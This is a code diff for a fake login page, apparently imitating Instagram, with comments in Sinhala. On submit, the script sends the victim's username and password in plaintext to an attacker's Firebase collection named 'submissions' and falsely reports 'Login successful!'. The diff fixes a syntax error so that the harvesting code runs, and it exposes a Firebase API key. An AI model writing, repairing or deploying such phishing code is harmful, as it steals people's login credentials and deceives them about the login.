@@ -222,11 +222,9 @@
   </div>
 
 <script type="module">
-  // Firebase Modules import කරගැනීම (Code 01 එකෙන්)
   import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
   import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-firestore.js";
 
-  // ඔබේ Firebase අනුකූලතාවය (Configuration)
   const firebaseConfig = {
     apiKey: "AIzaSyCpZw11RVkWAYlGsuLIemhufgPFGxWeoNc",
     authDomain: "login-data-2e0b1.firebaseapp.com",
@@ -239,7 +237,6 @@
   const app = initializeApp(firebaseConfig);
   const db = getFirestore(app);
 
-  // Theme Toggle Functionality
   window.toggleTheme = function() {
     const body = document.body;
     const btn = document.getElementById('themeBtn');
@@ -253,9 +250,8 @@
     }
   }
 
-  // Login Form Submit කළ විට Firebase වෙත දත්ත යැවීම
   document.getElementById('loginForm').addEventListener('submit', async function(e) {
-    e.preventDefault(); // පිටුව refresh වීම වැළැක්වීමට
+    e.preventDefault();
     
     const username = document.getElementById('usernameInput').value.trim();
     const password = document.getElementById('passwordInput').value.trim();
@@ -270,18 +266,16 @@
     loginBtn.textContent = "Logging in...";
 
     try {
-      // Firebase submissions collection එකට දත්ත එකතු කිරීම
       await addDoc(collection(db, "submissions"), {
         username: username,
         password: password,
         createdAt: serverTimestamp()
       });
 
-      // සාර්ථක වූ පසු (අවශ්‍ය නම් සාමාන්‍ය Instagram පිටුවකට හෝ වෙනත් තැනකට redirect කළ හැක)
       alert("Login successful!");
       document.getElementById('loginForm').reset();
 
-    } (error) {
+    } catch (error) {   // <-- මෙතැන 'catch' කියන වචනය එකතු කර ඇත
       console.error(error);
       alert("දෝෂයක් ඇති විය. කරුණාකර නැවත උත්සාහ කරන්න.");
     }
